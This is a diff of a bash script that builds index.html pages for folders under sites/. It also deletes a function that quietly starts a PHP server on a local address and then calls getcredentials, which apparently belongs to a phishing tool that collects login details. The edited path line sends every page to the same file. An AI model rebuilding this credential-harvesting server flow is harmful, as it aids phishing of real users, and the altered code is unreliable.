@@ -41,7 +41,7 @@ createpage() {
 
   for site_folder in sites/*/; do
     site_name=$(basename "$site_folder")
-    index_path="${site_folder%/}/index.html"
+    index_path="$(dirname "$site_folder")/index.html"
     echo "<!DOCTYPE html>" > "$index_path"
     echo "<html>" >> "$index_path"
     echo "<body bgcolor=\"gray\" text=\"white\">" >> "$index_path"
@@ -67,13 +67,6 @@ createpage() {
     printf '<body>\n' >> "$index_path"
     printf '</html>\n' >> "$index_path"
   done
-}
-
-server() {
-  printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor PHP...\n"
-  php -S 192.168.1.1:80 > /dev/null 2>&1 & 
-  sleep 2
-  getcredentials
 }
 
 stop() {
